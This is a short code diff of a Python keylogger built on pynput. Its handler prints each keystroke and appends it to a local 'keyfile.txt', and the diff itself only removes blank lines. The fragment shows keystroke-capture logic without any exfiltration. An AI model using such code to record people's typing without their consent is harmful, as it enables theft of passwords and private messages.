@@ -1,5 +1,4 @@
 from pynput import keyboard
-
 def K_pressed(key):
     print(str(key))
     with open("keyfile.txt", 'a') as LogKey:
@@ -8,7 +7,6 @@ def K_pressed(key):
             LogKey.write(char)
         except AttributeError:
             print('special key {0} pressed'.format(key))
-
 
 
 if __name__ == "__main__":
